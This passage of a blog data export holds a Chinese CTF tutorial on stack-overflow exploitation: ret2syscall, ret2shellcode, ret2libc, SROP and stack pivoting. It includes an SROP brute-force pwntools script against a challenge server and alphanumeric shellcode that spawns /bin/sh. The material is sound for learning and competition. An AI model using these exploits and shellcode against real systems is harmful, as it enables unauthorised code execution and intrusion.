假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖`got`为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall\n\n##### (2)爆破脚本写法\n\n一个爆破脚本模板:\n\n```python\nfrom pwn import *\nimport sys\n\nelf ='./ciscn_s_3'\nremote_add = 'node4.buuoj.cn'\nremote_port = 29554\n\nmain_add = 0x40051d\noff = 0x130\nsystem_add = 0x400517\nrtframe = 0x4004da\nret_add = 0x4004e9\n\ni = 0\n\nwhile i < 20:\n    try:\n        context.log_level = 'debug'\n        context.arch = 'amd64'\n        if sys.argv[1] == 'r':\n            p = remote(remote_add, remote_port, timeout = 1)\n        elif sys.argv[1] == 'd':\n            p = gdb.debug(elf)\n        else:\n            p = process(elf, timeout = 1)\n        payload1 = b'/bin/sh\\0' + cyclic(0x8)\n        payload1+= p64(main_add)\n\n        p.sendline(payload1)\n\n        stack_add = u64(p.recv(0x28)[-8::]) - off\n\n        frame = SigreturnFrame()\n        frame.rax = 0x3b\n        frame.rdi = stack_add\n        frame.rsi = 0\n        frame.rdx = 0\n        frame.rsp = stack_add\n        frame.rip = system_add\n\n        payload = b'/bin/sh\\0' + cyclic(0x8)\n        payload+= p64(rtframe)\n        payload+= p64(system_add)\n        payload+= bytes(frame)\n\n\n        #p.sendline('a')\n        #p.recvuntil('\\0')\n        p.sendline(payload)\n        p.recvuntil('/bin/sh')\n        p.sendline('cat flag')\n        print(p.recvline())\n        \n        p.close()\n    except BaseException as e:\n        p.close()\n\n    off+=0x8\n    i+=1\n\n```\n\n核心模板:\n\n```c\nwhile True:\n    try:\n\t\t// p = process()\n\t\t// pass\n        p.sendline('cat flag')\n        print(p.recvline())\n        p.close()\n    except BaseException as e:\n        p.close()\n    // pass\n\n```\n\n采用grep 获取输出包含flag的行就行\n\n\n\n#### 0x3.3.ret2dl_resolve()\n\n延迟绑定会使用_dl_resolve()函数\n\n- _dl_resolve中\n\n  _dl_resolve调用_dl_fixup, _dl_dixup流程：\n\n  1. 通过link_map 获得.dynsym、.dynstr、.rel.plt地址\n  2. 通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针\n  3. 通过&(ELF64_Rel)->r_info 和.dynsym取得对应Elf64_Sym指针\n  4. 检查r_info\n  5. 检查&(Elf64_Sym)->st_other\n  6. 通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数\n\n综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)\n\n|              | 修改 dynamic 节的内容 | 修改重定位表项的位置                                         | 伪造 linkmap                                         |\n| :----------- | :-------------------- | :----------------------------------------------------------- | :--------------------------------------------------- |\n| 主要前提要求 | 无                    | 无                                                           | 无信息泄漏时需要 libc                                |\n| 适用情况     | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |\n| 注意点       |                       | 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 | 确保重定位位置可写；需要着重伪造重定位表项、符号表； |\n\n\n\n### 0x4.Tricks\n\n#### 0x4.1.stack pivoting\n\n栈迁移技巧， 主要针对可溢出字节较少的情况，通过`leave`此类指令控制rsp\n\n```assembly\n;leave 相当于:\nmov rsp,rbp\npop rbp\n;那么考虑将栈帧中rbp地址改为栈迁移目的地址\n;leave两次之后，就可以将栈转移到目的地址\n;同时要现在目的地址布置好fake_stack\n```\n\n\n\n可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数\n\n\n\n不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:\n\n- 在第一次read读入后将rbp改为要写入的位置\n- ret到read\n- 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8\n- 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置\n\n\n\n#### 0x4.2.栈对齐\n\n栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。\n\n这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump\n\n可以:\n\n```bash\n$ gdb -c core\n```\n\n调试core文件\n\n如果终止指令类似于:\n\n```c\n ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0\n```\n\n说明是栈对齐的原因，小心调整栈帧就行\n\n\n\n#### 0x4.3.Stack smash\n\n对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。\n\n在开启cannary 防护的题目中，检测到栈溢出后，会调用 `__stack_chk_fail` 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag\n\n\n\n#### 0x4.4.SROP\n\n##### (1)前置知识:\n\n在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。\n\n那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。\n\n同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。\n\n\n\nSROP简要流程:\n\n1. 构造fake_frame\n2. 控制当前rsp指向fake_frame底部\n3. sigreturn调用\n\n\n\nsigFrame结构如下:\n\n```c\n// x64\nstruct _fpstate\n{\n  /* FPU environment matching the 64-bit FXSAVE layout.  */\n  __uint16_t        cwd;\n  __uint16_t        swd;\n  __uint16_t        ftw;\n  __uint16_t        fop;\n  __uint64_t        rip;\n  __uint64_t        rdp;\n  __uint32_t        mxcsr;\n  __uint32_t        mxcr_mask;\n  struct _fpxreg    _st[8];\n  struct _xmmreg    _xmm[16];\n  __uint32_t        padding[24];\n};\n\nstruct sigcontext\n{\n  __uint64_t r8;\n  __uint64_t r9;\n  __uint64_t r10;\n  __uint64_t r11;\n  __uint64_t r12;\n  __uint64_t r13;\n  __uint64_t r14;\n  __uint64_t r15;\n  __uint64_t rdi;\n  __uint64_t rsi;\n  __uint64_t rbp;\n  __uint64_t rbx;\n  __uint64_t rdx;\n  __uint64_t rax;\n  __uint64_t rcx;\n  __uint64_t rsp;\n  __uint64_t rip;\n  __uint64_t eflags;\n  unsigned short cs;\n  unsigned short gs;\n  unsigned short fs;\n  unsigned short __pad0;\n  __uint64_t err;\n  __uint64_t trapno;\n  __uint64_t oldmask;\n  __uint64_t cr2;\n  __extension__ union\n    {\n      struct _fpstate * fpstate;\n      __uint64_t __fpstate_word;\n    };\n  __uint64_t __reserved1 [8];\n};\n```\n\n\n\n##### (2)pwntools.srop\n\npwntools集成了SROP的模块，可以帮助制作fake_frame:\n\n```python\n// 一个简单的例子\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_read\nsigframe.rdi = 0\nsigframe.rsi = stack_addr\nsigframe.rdx = 0x400\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\n```\n\n\n\n","slug":"Multiple-attack-methods-of-Stack-Overflow","published":1,"updated":"2022-08-05T07:59:18.787Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6majb0009j8v08ptn3mbp","content":"<h3 id=\"0x1-杂谈\">0x1.杂谈</h3>\n<p>作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合我个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给我发邮件，进行补充。</p>\n<p>本文持续更新，为广大pwn选手入门提供完善帮助</p>\n<p>本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One</p>\n<p>怎么去看待栈溢出题呢?</p>\n<p>尽管利用方法多样，但是，就我个人的看法而言，整个栈溢出实际上只分为三种:</p>\n<p><strong>ret2syscall,  ret2libc,  ret2shellcode</strong></p>\n<p>实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。</p>\n<p>一般而言，pwn题的目的都是<code>getshell</code>(当然，也有直接读取flag的，这个后面单独谈)，而<code>getshell</code> 无外乎就三种途径，<code>syscall</code>，<code>libc-system</code>，<code>shellcode</code></p>\n<p>当拿到一个题目时，首先思考：</p>\n<p>是否有syscall----&gt;ret2syscall</p>\n<p>有可读可写内存空间吗----&gt;ret2shellcode</p>\n<p>给了libc文件或者有信息泄露函数(IO函数)----&gt;ret2libc</p>\n<p>接下来，再分门别类谈:</p>\n<h3 id=\"0x1-ret2syscall\">0x1.ret2syscall</h3>\n<p>因为syscall属于相对简单的，暂且放在前面谈。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">%rax</th>\n<th style=\"text-align:left\">System call</th>\n<th style=\"text-align:left\">%rdi</th>\n<th style=\"text-align:left\">%rsi</th>\n<th style=\"text-align:left\">%rdx</th>\n<th style=\"text-align:left\">%r10</th>\n<th style=\"text-align:left\">%r8</th>\n<th style=\"text-align:left\">%r9</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">59</td>\n<td style=\"text-align:left\">sys_execve</td>\n<td style=\"text-align:left\">const char *filename</td>\n<td style=\"text-align:left\">const char *const argv[]</td>\n<td style=\"text-align:left\">const char *const envp[]</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\"></td>\n</tr>\n</tbody>\n</table>\n<p>一般而言，需要<code>syscall</code>的题目中，都是构造这个系统调用实现。</p>\n<p>而在一些题目中通过<code>seccomp</code>禁用了<code>execve</code>的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。</p>\n<p>而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。</p>\n<p>在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。</p>\n<p>或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。</p>\n<p>总的而言，就是选择能够获取到地址的地方写入/bin/sh。</p>\n<p><strong>例题:</strong></p>\n<p>ciscn_s_3</p>\n<h3 id=\"0x2-ret2shellcode\">0x2.ret2shellcode</h3>\n<h4 id=\"0x2-1-shellcode的书写\">0x2.1.shellcode的书写</h4>\n<p>一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。</p>\n<p>一个简单的shellcode例子:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// execve(path = &#x27;/bin///sh&#x27;, argv = [&#x27;sh&#x27;], envp = 0)</span></span><br><span class=\"line\">push <span class=\"number\">0x68</span></span><br><span class=\"line\">mov rax, <span class=\"number\">0x732f2f2f6e69622f</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">mov rdi, rsp</span><br><span class=\"line\"><span class=\"comment\">// push argument array [&#x27;sh\\x00&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">// push b&#x27;sh\\x00&#x27; </span></span><br><span class=\"line\">push <span class=\"number\">0x1010101</span> ^ <span class=\"number\">0x6873</span></span><br><span class=\"line\">xor dword ptr [rsp], <span class=\"number\">0x1010101</span></span><br><span class=\"line\">xor esi, esi <span class=\"comment\">/* 0 */</span></span><br><span class=\"line\">push rsi <span class=\"comment\">/* null terminate */</span></span><br><span class=\"line\">push <span class=\"number\">8</span></span><br><span class=\"line\">pop rsi</span><br><span class=\"line\">add rsi, rsp</span><br><span class=\"line\">push rsi <span class=\"comment\">/* &#x27;sh\\x00&#x27; */</span></span><br><span class=\"line\">mov rsi, rsp</span><br><span class=\"line\">xor edx, edx <span class=\"comment\">/* 0 */</span></span><br><span class=\"line\"><span class=\"comment\">// call execve()</span></span><br><span class=\"line\">push SYS_execve <span class=\"comment\">/* 0x3b */</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n<p>这里获取<code>/bin/sh</code>地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。</p>\n<p>不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即<code>jmp  rax</code>此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。</p>\n<p>同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，<code>mov</code>和<code>syscall</code>都会遭到限制， 可用指令如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>数据传送:</span><br><span class=\"line\">push/pop eax…</span><br><span class=\"line\">pusha/popa</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>算术运算:</span><br><span class=\"line\">inc/dec eax…</span><br><span class=\"line\">sub al, 立即数</span><br><span class=\"line\">sub byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">sub dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">sub word ptr [eax… + 立即数], si di</span><br><span class=\"line\">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">sub si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span>逻辑运算:</span><br><span class=\"line\">and al, 立即数</span><br><span class=\"line\">and dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">and word ptr [eax… + 立即数], si di</span><br><span class=\"line\">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class=\"line\">and esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">and si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\">xor al, 立即数</span><br><span class=\"line\">xor byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">xor dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">xor word ptr [eax… + 立即数], si di</span><br><span class=\"line\">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">xor si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">4.</span>比较指令:</span><br><span class=\"line\">cmp al, 立即数</span><br><span class=\"line\">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">cmp word ptr [eax… + 立即数], si di</span><br><span class=\"line\">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">cmp si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">5.</span>转移指令:</span><br><span class=\"line\">push <span class=\"number\">56</span>h</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">cmp al, <span class=\"number\">43</span>h</span><br><span class=\"line\">jnz lable</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;=&gt; jmp lable</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">6.</span>交换al, ah</span><br><span class=\"line\">push eax</span><br><span class=\"line\">xor ah, byte ptr [esp] <span class=\"comment\">// ah ^= al</span></span><br><span class=\"line\">xor byte ptr [esp], ah <span class=\"comment\">// al ^= ah</span></span><br><span class=\"line\">xor ah, byte ptr [esp] <span class=\"comment\">// ah ^= al</span></span><br><span class=\"line\">pop eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">7.</span>清零:</span><br><span class=\"line\">push <span class=\"number\">44</span>h</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">sub al, <span class=\"number\">44</span>h ; eax = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">push esi</span><br><span class=\"line\">push esp</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">xor [eax], esi ; esi = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n<p>一般而言,  我们采用<code>xor</code>或者<code>sub</code>指令修改shellcode后面的值，构造<code>0f 05</code>， 实现syscall。</p>\n<p>一个例子(纯字母数字shellcode):</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129</span></span><br><span class=\"line\"><span class=\"comment\">/* from call rax */</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">push rax</span><br><span class=\"line\">pop rcx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* XOR pop rsi, pop rdi, syscall */</span></span><br><span class=\"line\">push <span class=\"number\">0x41413030</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x30</span>], eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* XOR /bin/sh */</span></span><br><span class=\"line\">push <span class=\"number\">0x34303041</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x34</span>], eax</span><br><span class=\"line\">push <span class=\"number\">0x41303041</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x38</span>], eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rdi = &amp;&#x27;/bin/sh&#x27; */</span></span><br><span class=\"line\">push rcx</span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x34</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rdx = 0 */</span></span><br><span class=\"line\">push <span class=\"number\">0x30</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x30</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">pop rdx</span><br><span class=\"line\"></span><br><span class=\"line\">push rax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rax = 59 (SYS_execve) */</span></span><br><span class=\"line\">push <span class=\"number\">0x41</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x7a</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* pop rsi, pop rdi*/</span></span><br><span class=\"line\"><span class=\"comment\">/* syscall */</span> </span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6f</span></span><br><span class=\"line\">.byte <span class=\"number\">0x4e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x44</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* /bin/sh */</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x52</span></span><br><span class=\"line\">.byte <span class=\"number\">0x59</span></span><br><span class=\"line\">.byte <span class=\"number\">0x5a</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x43</span></span><br><span class=\"line\">.byte <span class=\"number\">0x5a</span></span><br><span class=\"line\">.byte <span class=\"number\">0x41</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x2-2-shellcode生成工具\">0x2.2.shellcode生成工具</h4>\n<p>同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。</p>\n<h4 id=\"0x2-3-mprotect\">0x2.3.mprotect()</h4>\n<p>进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。</p>\n<p>这个函数可以修改指定内存段的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mprotect:</span><br><span class=\"line\">int mprotect(void *addr, size_t len, int prot);</span><br><span class=\"line\">addr 内存起始地址</span><br><span class=\"line\">len  修改内存的长度</span><br><span class=\"line\">prot 内存的权限，7为可读可写可执行</span><br></pre></td></tr></table></figure>\n<p>如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode</p>\n<h3 id=\"0x3-ret2libc\">0x3.ret2libc</h3>\n<h4 id=\"0x3-1-leak-libc\">0x3.1.leak_libc</h4>\n<p>对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.</p>\n<p>目前而言，我遇到的栈题中leak_libc，有两种方法：</p>\n<ol>\n<li>partial_overwrite<br>\n有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。</li>\n<li>通过puts，write等函数，打印<code>.got</code>，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ref:  https://github.com/lieanu/LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class=\"line\">obj = LibcSearcher(<span class=\"string\">&quot;fgets&quot;</span>, <span class=\"number\">0X7ff39014bd90</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;system&quot;</span>)        <span class=\"comment\">#system 偏移</span></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)    <span class=\"comment\">#/bin/sh 偏移</span></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;__libc_start_main_ret&quot;</span>)    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x3-2-partial-overwrite\">0x3.2.partial_overwrite</h4>\n<h5 id=\"1-前置知识\">(1)前置知识</h5>\n<p>针对没有泄露的赛题，可以考虑partial_overwrite改写<code>got</code>表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。</p>\n<p>考虑对于一个<code>got</code>表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖<code>got</code>为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall</p>\n<h5 id=\"2-爆破脚本写法\">(2)爆破脚本写法</h5>\n<p>一个爆破脚本模板:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span 